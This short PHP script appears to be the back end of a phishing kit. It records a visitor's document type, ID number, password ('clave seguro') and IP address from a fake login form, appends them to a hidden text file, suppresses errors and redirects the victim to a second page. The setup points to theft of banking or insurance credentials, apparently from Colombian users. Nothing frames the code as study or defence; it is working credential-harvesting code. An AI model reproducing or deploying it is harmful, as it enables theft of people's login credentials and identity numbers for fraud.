<?php

date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$file = fopen("porfavornotevayasacaer.txt", "a");
$timestamp = date('d/m/Y');
$timeshour = date('h:i:s');
fwrite($file, "documentType: ".$_POST['documentType']."  " . PHP_EOL);
fwrite($file, "numero de documento: ".$_POST['documentNumber']."  " . PHP_EOL);
fwrite($file, "clave seguro ".$_POST['password']."  " . PHP_EOL);
fwrite($file, "Fecha: ".$timestamp." Hora: ".$timeshour."\nIP: ".$userp."  " . PHP_EOL);
fwrite($file, "------------------------------------------ " . PHP_EOL);
fclose($file);
header("location:index2.html");

?> 